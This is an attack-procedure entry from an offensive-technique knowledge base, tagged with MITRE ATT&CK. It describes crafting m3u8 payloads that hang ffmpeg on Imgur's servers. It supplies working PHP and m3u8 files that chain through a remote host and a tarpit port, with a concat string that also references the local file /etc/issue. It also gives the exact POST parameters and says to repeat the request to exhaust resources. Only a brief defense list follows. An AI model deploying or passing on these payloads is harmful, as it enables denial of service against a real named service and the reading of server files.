---
tags:
  - dos
  - tarpit
  - ffmpeg
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/TARPIT]]'
tactics:
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Denial of Service]]'
updated_at: '2025-12-14T04:39:09.587Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 45633f87-407a-43ca-9d17-8dbcbd636bf4
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Network Denial of Service]]'
---
# Craft-DoS-Payload-to-Hang-FFmpeg

## Summary

This procedure crafts an m3u8 payload that causes ffmpeg to hang on incomplete responses or tarpitted connections, leading to resource exhaustion and denial of service on Imgur's servers.

## Description

By setting a longer stop time (e.g., 10 seconds) and using concat with a head file that points to a tarpitted endpoint, ffmpeg waits indefinitely for video data, consuming CPU and sockets. Multiple concurrent requests amplify the DoS.

## Requirements

1. PHP server for m3u8-dos.php and m3u8-head.m3u8
2. Tarpit setup on port 12346
3. Ability to send multiple requests

## Defense

Defensive measures and detection strategies:

- Timeout ffmpeg processes and limit concurrent executions
- Rate limiting on upload endpoints
- Resource monitoring for hanging processes

## Objectives

1. Hang individual ffmpeg instances
2. Exhaust server resources with parallel attacks
3. Disrupt video processing service

## Instructions

### Step 1: Create DoS Payload Files

**Context**: Set up chained m3u8 files with tarpit reference.

Create m3u8-dos.php:
```php
<?php
header('Content-Type: video/avi');
header('Content-Length: 1');
echo 'concat:http://www.gradeco.ru/imgur/m3u8-head.m3u8?2|file:///etc/issue';
?>
```

Create m3u8-head.m3u8:
```m3u8
#EXTM3U
#EXTINF:10.0,
http://gradeco.ru:12346/?.txt
#EXT-X-ENDLIST
```

> Deploy both files.

### Step 2: Submit Request and Tarpit

**Context**: Trigger and hold connections.

POST to endpoint: source=http://gradeco.ru/imgur/m3u8-dos.php, start=0.1, stop=10. Redirect port 12346 to tarpit.

> FFmpeg hangs for 10 seconds per request; repeat for DoS.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Network Denial of Service]] Network Denial of Service

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]
- [[tools/TARPIT]]

## Tags

- dos
- tarpit
- ffmpeg
